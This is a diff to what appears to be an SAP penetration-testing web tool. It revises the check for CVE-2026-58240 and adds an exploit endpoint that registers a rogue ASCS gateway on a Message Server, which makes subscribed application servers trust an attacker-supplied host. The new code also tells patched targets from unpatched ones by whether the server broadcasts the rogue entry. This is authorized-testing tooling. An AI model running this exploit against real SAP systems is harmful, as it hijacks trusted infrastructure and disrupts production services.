@@ -7870,13 +7870,17 @@ def create_app(api: SAPMAPApi) -> Bottle:
             # hint on failure — repeat only the final verdict + the
             # actionable next step so the operator gets the punchline.
             if found:
-                print(f"[+] {sid}: VULNERABLE — MS port "
+                print(f"[!] {sid}: MS port "
                       f"{node.cve_2026_58240_ms_port} recognises the "
-                      f"ASCS_GW opcode family.  Leaked ASCS identity: "
+                      f"ASCS_GW opcode family — kernel is in the "
+                      f"9.x fix window (CVE-2026-58240).  Leaked "
+                      f"ASCS identity: "
                       f"{node.cve_2026_58240_ascs_identity or '(none)'}."
-                      f"  Next: right-click → Exploitation → 'Register "
-                      f"Rogue ASCS Gateway (CVE-2026-58240)' to "
-                      f"exercise the write path.")
+                      f"  Whether the write path is blocked by the "
+                      f"patch is unknown — right-click → "
+                      f"Exploitation → 'Register Rogue ASCS Gateway "
+                      f"(CVE-2026-58240)' to confirm patched vs "
+                      f"unpatched.")
             else:
                 _ev = node.cve_2026_58240_evidence or "no_response"
                 print(f"[*] {sid}: not exposed to CVE-2026-58240 "
@@ -7888,21 +7892,23 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
     @app.route("/api/node/<sid>/exploit_cve_2026_58240_register", method="POST")
     def node_exploit_cve_2026_58240_register(sid):
-        """Register a rogue ASCS gateway entry (destructive).  Requires
-        the check step to have already confirmed the opcode family is
-        present.  Broadcasts the fake gateway to every subscribed AS —
-        potentially disruptive on a live system."""
+        """Register a rogue ASCS gateway entry (write path).  The check
+        phase can only tell us the opcode family is present — this
+        step distinguishes patched from unpatched by observing
+        whether the server emits the MsSSndAscsGwInfo broadcast."""
         response.content_type = "application/json"
         data = request.json or {}
         if not data.get("confirm"):
             return json.dumps({"error": "confirm=true required — "
-                                         "this action is destructive"})
+                                         "this action mutates target "
+                                         "state on unpatched kernels"})
         node = api.state.get_node(sid)
         if not node:
             return json.dumps({"error": f"Node {sid} not found"})
-        if not node.cve_2026_58240_vulnerable:
-            return json.dumps({"error": "run the check first — "
-                                         "opcode family status unknown"})
+        if node.cve_2026_58240_evidence != "opcode_recognised":
+            return json.dumps({"error": "run the check first and "
+                                         "confirm 'opcode_recognised' "
+                                         "before attempting to register"})
         ms_port = node.cve_2026_58240_ms_port or 3900
         attacker_ip = data.get("attacker_ip") or "127.0.0.1"
         rogue_port = int(data.get("rogue_port") or 31337)
@@ -7921,17 +7927,83 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 print(f"[-] {sid}: register failed: {e!r}")
                 return
             print(f"[*] {sid}: register result: {r}")
-            if r.get("ok"):
+
+            # Outcome interpretation:
+            #   broadcast_seen=True                  → CONFIRMED VULNERABLE
+            #   broadcast_seen=False, reply_len>100  → likely PATCHED
+            #                                          (server processed
+            #                                          the packet but did
+            #                                          NOT re-broadcast the
+            #                                          registration)
+            #   reply_len==0 AND error != ''         → INDETERMINATE
+            #                                          (network / silent
+            #                                          drop)
+            reply_len = r.get("reply_len", 0)
+            broadcast = r.get("broadcast_seen", False)
+            if broadcast:
+                node.cve_2026_58240_vulnerable = True
                 node.cve_2026_58240_registered = True
+                node.cve_2026_58240_evidence = "confirmed_vulnerable"
+                print(f"[!!] {sid}: CONFIRMED VULNERABLE — "
+                      f"broadcast fired, rogue ASCS registered.")
                 sapmap_findings.emit_finding(
                     "CRITICAL", sid,
-                    f"CVE-2026-58240 — rogue ASCS gateway "
-                    f"registered on {node.ip}:{ms_port} "
-                    f"(broadcast confirmed).  Every subscribed "
-                    f"AS now trusts {attacker_ip}:{rogue_port}.",
+                    f"CVE-2026-58240 — rogue ASCS gateway registered "
+                    f"on {node.ip}:{ms_port} (broadcast confirmed). "
+                    f"Every subscribed AS now trusts "
+                    f"{attacker_ip}:{rogue_port} as the ASCS "
+                    f"gateway.  Cleanup via 'Unregister Rogue ASCS "
+                    f"Gateway' menu action.",
                     cve="CVE-2026-58240",
                     ref="ms.ascs_gw.registered",
                     attack_capability="exploit.ms_ascs_gw_rogue")
+            elif reply_len > 100:
+                # Server responded but refused to broadcast — patched.
+                node.cve_2026_58240_vulnerable = False
+                node.cve_2026_58240_registered = False
+                node.cve_2026_58240_evidence = "confirmed_patched"
+                print(f"[+] {sid}: CONFIRMED PATCHED — server "
+                      f"processed the LOGON packet ({reply_len} B "
+                      f"reply) but refused to broadcast the "
+                      f"registration.  Kernel is at 9.16 PL100+ / "
+                      f"9.18 PL032+ / 9.19 PL017+ / 9.20 PL007+.")
+                sapmap_findings.emit_finding(
+                    "INFO", sid,
+                    f"CVE-2026-58240 write-path probe returned no "
+                    f"broadcast — {node.ip}:{ms_port} appears "
+                    f"patched (server replied {reply_len} B but did "
+                    f"not push MsSSndAscsGwInfo).  Kernel is at the "
+                    f"CVE-2026-58240 fix level.  The MEDIUM "
+                    f"finding for ASCS identity leak still applies "
+                    f"— that pre-auth leak is unchanged by the "
+                    f"patch.",
+                    cve="CVE-2026-58240",
+                    ref="ms.ascs_gw.patched",
+                    attack_capability="")
+                # Drop the earlier "opcodes present" finding — the
+                # patched outcome supersedes it.
+                node.findings = [f for f in node.findings
+                    if f.name != "MS ASCS_GW Opcode Family Present "
+                                   "(CVE-2026-58240)"]
+                node.findings.append(Finding(
+                    name="MS ASCS_GW Patched (CVE-2026-58240)",
+                    severity=Severity.INFO,
+                    description=(
+                        "The Message Server ASCS_GW opcode is "
+                        "present but the write path is blocked — "
+                        "kernel is at fix level PL100+/PL032+/"
+                        "PL017+/PL007+.  Pre-auth ASCS identity "
+                        "leak via opcode 82 empty-body probe is "
+                        "still observable; not addressed by this "
+                        "SAP Note."),
+                    detail=(f"Register outcome: reply_len={reply_len}, "
+                            f"broadcast_seen=False")))
+            else:
+                # Indeterminate — timeout / silent drop / error path.
+                err = r.get("error") or "no server reply"
+                print(f"[?] {sid}: INDETERMINATE — {err} "
+                      f"(reply_len={reply_len}).  Not updating "
+                      f"vulnerable flag.")
 
         _bg(f"{sid}:register_cve_58240",
              "CVE-2026-58240 rogue ASCS_GW register", _run)
@@ -16350,11 +16422,13 @@ def create_app(api: SAPMAPApi) -> Bottle:
                   f"(MS ASCS_GW opcodes)...")
             try:
                 sapmap_scanner.check_cve_2026_58240(node)
-                if node.cve_2026_58240_vulnerable:
-                    print(f"[+] {sid}: MS port "
+                if node.cve_2026_58240_evidence == "opcode_recognised":
+                    print(f"[!] {sid}: MS port "
                           f"{node.cve_2026_58240_ms_port} recognises "
                           f"ASCS_GW opcodes — leaked identity "
-                          f"{node.cve_2026_58240_ascs_identity!r}")
+                          f"{node.cve_2026_58240_ascs_identity!r}. "
+                          f"Patched/unpatched status determined "
+                          f"only by the register step.")
             except Exception as e:
                 logger.debug(f"{sid}: CVE-58240 check failed: {e}")
 
